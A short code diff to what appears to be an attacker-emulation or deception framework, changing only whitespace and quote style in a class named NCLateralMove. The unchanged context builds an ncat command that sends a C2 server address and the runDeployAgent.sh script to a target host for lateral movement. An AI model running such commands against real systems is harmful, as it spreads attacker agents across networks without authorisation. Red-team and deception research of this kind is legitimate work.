@@ -2,6 +2,7 @@ from ..low_level_action import LowLevelAction
 from models.attacker.agent import Agent
 from config.settings import settings
 
+
 class NCLateralMove(LowLevelAction):
     ability_name = "deception-ncshell"
 
@@ -10,6 +11,6 @@ class NCLateralMove(LowLevelAction):
         self.port = port
 
         command = f'{{ echo "server={settings.c2_server}"; cat runDeployAgent.sh; }} | ncat --no-shutdown -i 5s {host_ip} #{port}'
-        payloads = ['runDeployAgent.sh']
+        payloads = ["runDeployAgent.sh"]
 
         super().__init__(agent, command, payloads=payloads)
